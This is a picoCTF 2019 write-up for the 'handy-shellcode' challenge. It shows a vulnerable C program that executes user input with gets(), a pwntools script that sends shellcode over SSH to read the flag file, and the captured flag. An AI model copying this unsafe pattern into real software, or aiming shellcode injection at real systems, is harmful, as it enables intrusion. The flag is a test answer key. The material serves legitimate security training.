# Binary Exploitation
```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```
This program uses c's ability to treat a data pointer as a function pointer. Therefor we can send it any shellcode we want. To do this we use [pwntools](https://github.com/Gallopsled/pwntools)

```python
from os import environ
from pwn import *

EXEC='/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln'
FLAG='/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/flag.txt'

s = ssh(host='2019shell1.picoctf.com',
        user=environ["PICOUSER"],
        password=environ["PICOPSWD"])
sh = s.process(EXEC)
shellcode = asm(shellcraft.i386.cat(FLAG))
sh.sendlineafter('Enter your shellcode:', shellcode)
x = sh.recvrepeat()
print(x.decode(errors='ignore').split('...')[-1][1:])
s.close()

```
Notes:
    - We do this on our own machine, it's just nicer
    - The username and password should be in the bash variables `PICOUSER` and `PICOPSWD` respectivly
    - `shellcraft.i386.cat` constucts asembly to cat the flag. The `asm` function turns the string code to binary.
    - We need to do some annoying binary conversion. 

flag: `picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}`